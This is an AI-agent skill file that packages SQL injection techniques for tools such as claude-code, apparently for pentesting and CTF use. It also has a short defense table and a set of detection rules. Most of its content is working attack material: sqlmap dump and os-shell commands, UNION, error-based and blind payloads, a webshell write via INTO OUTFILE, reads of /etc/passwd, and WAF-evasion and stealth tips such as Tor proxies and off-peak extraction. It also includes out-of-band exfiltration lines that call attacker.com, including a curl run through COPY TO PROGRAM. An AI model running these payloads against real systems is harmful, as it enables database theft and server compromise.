---
name: web-sqli
description: "SQL injection attacks and defense - covering all major SQLi types including error-based, union-based, blind (boolean/time), double query (error-based), stacked queries, and out-of-band injection."
origin: openclaw
version: "0.2.0.2"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 5
  guide_count: 14
  owasp: "A03:2021-Injection"
  mitre: "T1190-Exploit Public-Facing App"
  last_reviewed: "2026-07-19"
---




# Skill: SQL Injection

> **Supplementary Files**:
> - `payloads.md` — Payload collection organized by 10 injection types (injection detection, UNION, Error, Blind, Double Query, WAF bypass, cross-database, file read/write)
> - `test-cases.md` — Structured test case templates (12 cases covering injection detection, UNION, Error-based, Blind, advanced exploitation - 5 categories)
> - `sqli-double-query-guide.md` — Double Query injection complete guide（extractvalue/updatexml/floor allcovering）
> - `sqli-cross-db-guide.md` — MySQL/PostgreSQL/MSSQL/Oracle cross-database injection guide

## Summary

Web Sqli skill domain covering web attack operations.

**Tools**: sqlmap, Burp Suite, curl, manual injection, browsetool DevTools

**Domain**: web-attack

**OWASP**: A03:2021-Injection

**MITRE ATT&CK**: T1190-Exploit Public-Facing App

## Description

SQL injection attacks and defense - covering all major SQLi types including error-based, union-based, blind (boolean/time), double query (error-based), stacked queries, and out-of-band injection. This skill covers the complete attack chain from detection to exploitation, along with corresponding defense strategies。

**Agent canpowerstatement**: Completed all 65 levels of SQLi-Labs, achieved expert-level proficiency in Double Query injection, with batch automated testing tools。

## Use Cases / Use Cases

1. **Web applicationpenetration testing** - Detect and exploit SQL injection vulnerabilities in target application, extract sensitive database information
2. **CTF competition challenges** - Quickly identify SQL injection challenge types (echo/blind/error/filter bypass), construct effective payloads
3. **security code audit** - Review application database interaction code from defense perspective, identify unsafe query construction
4. **WAF bypassresearch** - Construct encoding/transformation bypass payloads for scenarios filtering keywords, comment chars, spaces
5. **crossdatabaseinjection** - Specific injection techniques for MySQL, PostgreSQL, MSSQL, Oracle database engines

## Core Tools / Core Tools

| Tool | Purpose | Command Example |
|------|------|----------|
| **sqlmap** | Automated SQL injection detection and exploitation | `sqlmap -u "URL" --batch --dbs --threads=5` |
| **Burp Suite** | Intercept and modify HTTP requests, test POST/Header/Cookie injection | Repeater modulemanual debug payload |
| **curl** | quick GET injectiontesting | `curl "http://target/page?id=1' order by 3-- -"` |
| **manual injection** | understandprinciple basic technique | UNION / Error / Blind / Double Query |
| **browsetool DevTools** | Observe HTTP response differences, assist blind injection judgment | Network panelcapturepackageanalysis |

## Methodology / Methodology

### Attack Chain / Attack Chain

```
Detection → Fingerprinting → Exploitation → Data Extraction → Privilege Escalation
```

**1. Detection (Detectinjection point)**
- single quotetesting: `id=1'` / `id=1' -- -` / `id=1' and '1'='1`
- numberValuetypetesting: `id=1 and 1=1` / `id=1 and 1=2`
- judgeclosure method: `'` / `"` / `')` / `"))` / noclosure（entiretype）

**2. Fingerprinting (fingerprinting)**
- Determine column count: `' ORDER BY N-- -` (increment N until error)
- Identifydatabasetype: `@@version` (MySQL) / `version()` (PostgreSQL) / `@@servername` (MSSQL)
- confirminjection type: echo / error / blind injection / noecho

**3. Exploitation (categorized exploitation)**
- UNION injection: `' UNION SELECT 1,2,3-- -`（echoscenario）
- Error-based: `extractvalue()` / `updatexml()` / `floor()+rand()+group by`
- Boolean Blind: `' AND (SELECT LENGTH(database()))>5-- -`
- Time Blind: `' AND IF(1=1,SLEEP(3),0)-- -`
- Double Query: `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`
- Stacked Queries: `; INSERT INTO users VALUES(...)-- -`

**4. Data Extraction (data extraction)**
- Enumeratedatabase: `SELECT schema_name FROM information_schema.schemata`
- Enumeratetable: `SELECT table_name FROM information_schema.tables WHERE table_schema='TARGET_DB'`
- Enumeratecolumn: `SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE'`
- Extractdata: `SELECT username,password FROM TARGET_TABLE`

**5. Privilege Escalation (privilege escalation)**
- file read/write: `LOAD_FILE('/etc/passwd')` / `INTO OUTFILE '/var/www/html/shell.php'`
- operating system commands: `sqlmap --os-shell`

### Defense Perspective / Defense Perspective

| Defense Measure | Description | Priority |
|----------|------|--------|
| Parameterized Queries | Use prepared statements to fundamentally separate code from data | CRITICAL |
| ORM framework | use SQLAlchemy / Django ORM / Hibernate etc., avoid hand-written SQL | HIGH |
| Input Validation | Whitelist validate input type, length, format, reject illegal characters | HIGH |
| Least Privilege DB Accounts | Application uses least privilege database account, disable FILE/ADMIN permissions | HIGH |
| WAF (Web Application Firewall) | Deploy ModSecurity rules to block common injection patterns | MEDIUM |
| Error Handling | Disable detailed error messages in production, return generic error pages | MEDIUM |
| CSP & HttpOnly | Prevent data theft via XSS after injection | LOW |

## Practical Steps / Practical Steps

> **See payloads.md for detailed payloads, and test-cases.md for complete test checklist。** Below is a summary of core operations at each stage。

### Step 1: sqlmap automated Detect

```bash
# Basic detection (automatically identify injection type and technique)
sqlmap -u "http://target/page?id=1" --batch --threads=5

# Enumerate all databases
sqlmap -u "http://target/page?id=1" --batch --dbs

# Enumerate target database tables
sqlmap -u "http://target/page?id=1" --batch -D target_db --tables

# Enumerate columns and extract data
sqlmap -u "http://target/page?id=1" --batch -D target_db -T users --dump

# POST injection detection
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch

# Cookie injection detection
sqlmap -u "http://target/page" --cookie="session=abc123" --batch

# Specify injection technique (UNION only)
sqlmap -u "http://target/page?id=1" --technique=U --batch

# Specify injection technique (Double Query / Error-based)
sqlmap -u "http://target/page?id=1" --technique=E --batch

# Bypass WAF (tamper scripts)
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch
```

### Step 2: manual UNION injection（echoscenario）

```sql
-- 1. Determine column count
' ORDER BY 3-- -    -- 成功
' ORDER BY 4-- -    -- 失败，说明共 3 列

-- 2. Determine echo position
' UNION SELECT 1,2,3-- -

-- 3. Extractdatabaseinformation（assumptionNo. 2、3 columnhasecho）
' UNION SELECT 1,database(),version()-- -

-- 4. Enumerate table names
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

-- 5. Enumerate column names
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

-- 6. Extractdata
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### Step 3: Double Query injection（errorscenario - expertlevel）

```sql
-- extractvalue() method（MySQL 5.1.5+，mostlength 32 characters）
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+
-- errorecho: XPATH syntax error: '~security~'

-- updatexml() method（MySQL 5.1.5+，mostlength 32 characters）
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--+

-- floor()+rand()+group by (classic method, no length limitation)
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- Extracttablename（Double Query）
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--+

-- Truncated reading for long data (exceeding 32 characters, use SUBSTRING)
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,31),0x7e))--+
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),32,31),0x7e))--+
```

### Step 4: Blind injection（noechoscenario）

```sql
-- Boolean Blind: Judge based on page content differences
' AND (SELECT LENGTH(database()))>5-- -      -- 页面正常 → 长度 > 5
' AND (SELECT LENGTH(database()))>10-- -     -- 页面异常 → 长度 <= 10
' AND SUBSTRING((SELECT database()),1,1)='s'-- -  -- 逐字符提取

-- Time Blind: Judge based on response time
' AND IF((SELECT LENGTH(database()))>5,SLEEP(3),0)-- -
' AND IF(SUBSTRING((SELECT database()),1,1)='s',SLEEP(3),0)-- -
```

### Step 5: Cross-database injection quick reference

```sql
-- PostgreSQL Error-based injection
' AND 1=CAST((SELECT version()) AS int)--

-- MSSQL Error-based injection
' AND 1=CONVERT(int,(SELECT @@version))--

-- Oracle Error-based injection
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

## Detection Methods

Modern SQLi detection combines WAF signatures, database audit logging, and behavioral anomaly analysis. Understanding these signals helps testers operate more stealthily and helps defenders prioritize monitoring.

### Database-Level Indicators
- **Query anomalies**: Unexpected `UNION`, `--`, `/* */`, `;`, `xp_cmdshell` in DB query logs.
- **Information schema access**: Unusual queries against `information_schema.tables` / `information_schema.columns` (MySQL), `sys.tables` (MSSQL), `ALL_TABLES` (Oracle).
- **Error message leakage**: DB errors returned to client revealing version, table structure, or column names.
- **Slow query outliers**: Time-based blind injection produces queries taking 5-30s (vs. typical <100ms).
- **Bulk SELECT patterns**: Sudden spike in `SELECT * FROM users WHERE ...` queries (credential extraction).

### Application-Level Indicators
- **Parameter length outliers**: Query parameters exceeding typical length distributions (>200 chars).
- **Encoding anomalies**: URL-encoded characters in unusual positions (`%27`, `%20UNION`, `%2D%2D`).
- **SQL keyword frequency**: Statistical anomaly in `SELECT|UNION|AND|OR|FROM|WHERE` in request parameters.
- **HTTP response size variance**: Significant differences in response size between benign and malicious requests (UNION-based extraction).

### SIEM / WAF Detection Rules
- **ModSecurity CRS**: Rules `942100-942999` cover SQLi patterns (OWASP Core Rule Set, paranoia levels 1-4).
- **Cloudflare**: Managed rule "Cloudflare SQLi" + machine learning augmentation.
- **AWS WAF**: `AWSManagedRulesSQLiRuleSet` with sensitivity tuning.
- **Imperva WAF**: Signature-based + behavioral correlation engine.
- **Splunk SPL**: `index=waf "UNION" "SELECT" "FROM" http.request.uri | stats count by source.ip | where count > 5`
- **Database Audit Log**: MySQL Enterprise Audit / Oracle Audit Vault / SQL Server Audit for query-level tracking.

### Behavioral Detection
- **Honeypot data**: Plant fake rows (e.g., user `admin_honeypot`) and alert when queried.
- **Canary tokens**: Embed unique tokens in database fields; alert on exfiltration attempts.
- **Anomaly ML**: Train on normal query patterns; flag outliers (e.g., unsupervised isolation forest).

## Defense Evasion Techniques

### WAF Bypass
- **Keyword splitting**: `UN/**/ION SEL/**/ECT` (inline comments split keywords).
- **Case variation**: `UnIoN sElEcT`, `OrDeR By`.
- **Encoding**: URL-encoding (`%55nION`), hex (`0x55`), char() (`CHAR(85)`).
- **Whitespace alternatives**: Tab (`\t`), newline (`\n`), form feed (`\f`) instead of spaces.
- **Equivalent functions**: `MID()` for `SUBSTRING()`, `LIMIT` for `TOP`, `CONCAT_WS()` for `CONCAT()`.
- **No-quote strings**: `0xHex` (MySQL) or `CHR(65)||CHR(66)` (Oracle) to avoid quotes.

### Filter Evasion
- **Comment alternatives**: `--`, `#`, `/* */`, `;%00` (null byte), `/**/` (inline).
- **Quote alternatives**: `\"`, `\`, `\x27` (hex escape).
- **Operator alternatives**: `LIKE` for `=`, `BETWEEN` for `IN`, `NOT IN` for `<>`.
- **Boolean blind**: `AND 1=1` vs `AND 1=2` response differential.
- **Time-based blind**: `IF(condition, SLEEP(5), 0)`, `WAITFOR DELAY '0:0:5'` (MSSQL), `dbms_pipe.receive_message(('a'),5)` (Oracle).

### Database-Specific Tricks
- **MySQL**: `INTO OUTFILE` for webshell upload; `LOAD DATA INFILE` for file read; `global.general_log` for query logging pivot.
- **PostgreSQL**: `COPY (SELECT ...) TO '/tmp/x'` for file write; `lo_import`/`lo_export` for large object file ops.
- **MSSQL**: `xp_cmdshell` for OS command execution; `OPENROWSET` for OLEDB pivot; `sp_oacreate` for COM object abuse.
- **Oracle**: `DBMS_JAVA.RUNJAVA` for Java execution; `UTL_HTTP` for outbound requests; `DBMS_LDAP` for LDAP queries.

### Stealth Techniques
- **Slow extraction**: Sleep 2-3s between requests to avoid rate-based detection.
- **Distributed source**: Rotate through residential proxies / Tor circuits to avoid IP-based blocking.
- **Off-peak timing**: Run extraction during low-traffic hours to blend with maintenance queries.
- **Result caching**: Cache extracted bytes locally; minimize repeated queries for same data.
- **Differential response analysis**: Compare full response byte-by-byte rather than relying on error messages.

### Out-of-Band (OOB) Exfiltration
- **DNS exfil (MySQL)**: `SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.attacker.com\\\\x'))`.
- **DNS exfil (MSSQL)**: `EXEC master..xp_dirtree '\\\\'+CONVERT(varchar, @@version)+'.attacker.com\\x'`.
- **HTTP exfil (Oracle)**: `UTL_HTTP.REQUEST('http://'||user||'.attacker.com/')`.
- **DNS exfil (PostgreSQL)**: `COPY (SELECT ...) TO PROGRAM 'curl http://attacker.com/?data=$(base64 data)'`.

## Hacker Laws / Hacker Laws

1. **Trust but Verify (Trust but Verify)** - Never trust user input. Any data from the client can be tampered with, including URL parameters, POST body, HTTP Header, Cookie. All input must be strictly validated and parameterized on the server side。

2. **First Principles (First Principles)** - The root cause of SQL injection is mixing code with data. Understand SQL engine parsing: single quotes close strings, comment chars truncate statements, UNION merges result sets. Master the underlying principles and any filter bypass is just a transformation problem。

3. **Divergent Thinking (Divergent Thinking)** - When one injection path is blocked, there are always alternative paths。UNION filtered -> try Error-based; no echo -> switch to Blind; keywords blocked -> encoding/case/comments/equivalent function replacement。Success belongs to those who find the most alternative paths。

4. **Economy of Mechanism (Economy of Mechanism)** - Simpler defense is more secure. Parameterized queries are the simplest and most effective defense. Complex input filtering and blacklists actually introduce more attack surface。

## Learning Resources / Learning Resources

**Skill supplementary files**:
- `payloads.md` — Complete payload collection (10 injection types, ready to copy and use)
- `test-cases.md` — Structured test cases (12 case templates, with prerequisites and expected results)
- `sqli-double-query-guide.md` — Double Query injection complete guide
- `sqli-cross-db-guide.md` — Cross-database injection guide

**Extended Learning Materials (guides/)**:
- `guides/ctf_sqli_practice_guide.md` - CTF SQL injection challenge type classification and solving methods
- `guides/portswigger_sqli_labs.md` - PortSwigger Academy SQL injection lab progress
- `guides/real_world_sqli_case_studies.md` - Real-world CVE SQL injection case studies
- `guides/double_query_study_findings.md` - Double Query Practical findings and environment limitation analysis

**Related Skills**:
- `skills/web-auth-bypass/SKILL.md` — Authentication bypass (SQLi can extract credentials to assist auth attacks)
- `skills/web-access-control/SKILL.md` — Access control (SQLi can extract user IDs to assist privilege escalation testing)

**External Resources**:
- [PortSwigger Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLi-Labs (audi-1)](https://github.com/Audi-1/sqli-labs)
- [sqlmap Official documentation](https://sqlmap.org/)
- [MySQL Official documentation - Security](https://dev.mysql.com/doc/refman/8.0/en/security.html)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
